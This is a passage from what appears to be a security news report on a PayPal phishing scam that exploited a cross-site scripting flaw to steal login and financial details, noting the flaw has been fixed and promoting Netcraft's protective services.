If the victim logs in via the fake login page , their PayPal username and password is transmitted to the fraudsters and they are subsequently presented with another page which requests them to enter further details to remove limits on the access of their account .
Information requested includes social security number , credit card number , expiration date , card verification number and ATM PIN .
The server currently running the scam is hosted in Korea and is accessed via a hex - encoded IP address .
The Netcraft Toolbar already protects PayPal users by blocking access to this site .
UPDATE : Paypal has now addressed this vulnerability .
A company spokesman said Paypal is working with the Internet service provider that hosts the malicious site to get it shut down , and does not yet know how many people may have fallen victim to the scam .
Netcraft 's Web Application Security Testing service can identify similar cross -site scripting flaws on your organization 's web servers .
